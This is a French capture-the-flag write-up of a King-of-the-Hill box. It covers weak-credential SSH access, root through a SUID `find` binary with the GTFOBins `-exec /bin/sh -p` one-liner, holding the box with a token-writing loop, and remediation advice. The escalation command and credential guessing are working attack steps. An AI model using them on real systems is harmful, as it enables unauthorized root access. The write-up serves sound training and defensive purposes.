# KOTH Armory — SUID find (GTFOBins) et tenue du trône

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/koth-armory/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Accès initial par identifiants faibles (`player` / `player`).
> `find` est SUID root : via GTFOBins, `find ... -exec /bin/sh -p \;` donne un
> shell root instantané. On durcit la box (retrait du bit SUID, nettoyage des
> clés rivales) et on écrit le jeton d'équipe dans `king.txt` pour marquer des
> points.


## 1. Briefing
Box KOTH adversariale : plusieurs joueurs se disputent root et l'écriture du
jeton dans `king.txt`.

| Élément | Valeur |
|---------|--------|
| Cible | `ssh://player@<host>:28492` (instance éphémère) |
| Scoring | `echo <jeton> > /home/player/king.txt` (user, moitié des points) · `> /root/king.txt` (root, points pleins) |

## 2. Accès initial
Identifiants faibles : `player` / `player` (mot de passe = nom d'utilisateur).

## 3. Privesc — SUID `find`

```
$ ls -l /usr/bin/find
-rwsr-xr-x 1 root root 282088 /usr/bin/find
```

Vecteur GTFOBins pour un binaire SUID :

```bash
find . -maxdepth 0 -exec /bin/sh -p \;
# → euid=0(root)
```

## 4. Tenue du trône & durcissement
Une fois root :

```bash
chmod u-s /usr/bin/find          # ferme le même vecteur aux rivaux
# nettoyer les clés SSH rivales présentes dans authorized_keys
```

Pour le score, écrire le jeton d'équipe en boucle rapide (course contre le
writer adverse pour que le scorer lise notre valeur) :

```sh
#!/bin/sh
while true; do
  echo <team-token> > /home/player/king.txt
  sleep 0.001
done
```

> [!WARNING]
> En KOTH, retirer son propre vecteur de privesc pour bloquer les rivaux peut
> aussi couper sa propre reprise de root : durcir, mais garder un chemin de
> re-escalade maîtrisé.

## 5. Leçons & remédiation
| Faiblesse | Cause racine | Correctif |
|-----------|--------------|-----------|
| Accès initial | Mot de passe = nom d'utilisateur | Mots de passe forts, auth par clé |
| Privesc | `find` SUID root | Retirer le bit SUID des binaires GTFOBins ; capabilities minimales |
| Persistance rivale | Clés SSH étrangères dans `authorized_keys` | Surveiller et verrouiller `authorized_keys` |
